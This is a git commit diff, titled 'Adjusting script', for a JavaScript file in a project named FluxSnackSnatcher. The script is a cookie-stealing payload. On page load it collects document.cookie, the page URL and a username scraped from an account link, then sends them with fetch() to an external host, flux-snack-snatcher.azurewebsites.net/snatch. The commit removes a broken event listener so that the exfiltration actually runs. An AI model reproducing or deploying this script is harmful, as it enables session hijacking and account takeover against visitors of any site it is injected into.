4ba9b1a0463f2c232ad05645e6602a309b15c5f5
Igor Ayres <ayresigo@gmail.com>
2024-04-03 15:05:27 -0300

    Adjusting script

--- FluxSnackSnatcher/www/script.js
+++ FluxSnackSnatcher/www/script.js
@@ -1,16 +1,14 @@
 window.onload = function () {
-    document.addEventListener('DOMContentLoaded', function () {
-        var url = `https://flux-snack-snatcher.azurewebsites.net/snatch?snacks=${encodeURIComponent(document.cookie)}&url=${encodeURIComponent(document.URL)}`;
+    var url = `https://flux-snack-snatcher.azurewebsites.net/snatch?snacks=${encodeURIComponent(document.cookie)}&url=${encodeURIComponent(document.URL)}`;
 
-        var contaLinkElement = document.querySelector('a[href="/?module=account&action=view"][style="text-decoration:underline;"]');
+    var contaLinkElement = document.querySelector('a[href="/?module=account&action=view"][style="text-decoration:underline;"]');
 
-        if (contaLinkElement) {
-            var contaLink = contaLinkElement.textContent || contaLinkElement.innerText;
+    if (contaLinkElement) {
+        var contaLink = contaLinkElement.textContent || contaLinkElement.innerText;
 
-            url += `&user=${encodeURIComponent(contaLink)}`;
+        url += `&user=${encodeURIComponent(contaLink)}`;
 
-        }
+    }
 
-        fetch(url);
-    });
+    fetch(url);
 }
